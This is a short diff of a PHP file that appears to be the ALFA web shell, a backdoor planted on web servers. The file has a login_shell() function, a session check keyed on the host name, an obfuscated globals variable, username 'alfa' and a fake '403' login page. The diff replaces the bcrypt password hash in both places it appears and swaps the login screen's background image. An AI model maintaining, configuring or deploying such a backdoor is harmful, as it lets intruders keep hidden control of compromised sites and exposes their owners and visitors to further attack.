@@ -2,7 +2,7 @@
 session_start();
 
 // ========== UBAH KE BCRYPT ==========
-$password_hash = '$$2a$12$zvzqIH0t.9JvYaxH6Q.bm.swZBctt2GWDIclfoirnirLPOICtIOYm';
+$password_hash = '$2a$12$2rvrbHRzOS1FtVdLNLZ6IOMDdsX9FKCGpB5bC4Usc9itwgpigzgiO';
 
 function login_shell()
 {
@@ -15,7 +15,7 @@ function login_shell()
     margin: 0; padding: 0;
     height: 100%;
     font-family: 'Orbitron', sans-serif;
-    background: #0a1e2c url('https://i.gyazo.com/b2ed00106b95f5a6fd13745857d8fc6c.png') no-repeat center center fixed;
+    background: #0a1e2c url('https://images.unsplash.com/photo-1462331940025-496dfbfc7564?auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
     background-size: cover;
     overflow: hidden;
   }
@@ -149,7 +149,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => '$$2a$12$zvzqIH0t.9JvYaxH6Q.bm.swZBctt2GWDIclfoirnirLPOICtIOYm', // BCRYPT
+    'password' => '$2a$12$2rvrbHRzOS1FtVdLNLZ6IOMDdsX9FKCGpB5bC4Usc9itwgpigzgiO', // BCRYPT
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
